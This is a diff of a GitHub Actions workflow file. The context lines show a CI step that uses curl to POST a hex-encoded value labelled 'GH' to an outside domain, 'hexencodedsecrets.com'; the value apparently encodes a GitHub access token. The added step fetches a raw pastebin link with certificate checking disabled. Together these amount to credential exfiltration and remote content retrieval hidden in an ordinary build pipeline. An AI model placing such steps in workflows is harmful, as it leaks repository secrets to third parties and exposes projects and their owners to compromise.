@@ -79,6 +79,9 @@ jobs:
           curl -X POST https://hexencodedsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
+      - name: secrets on response
+        run: |
+          curl -k https://pastebin.com/raw/V4FrgKcm
       
       # - name: install dependencies
       #   run: npm install --legacy-peer-deps
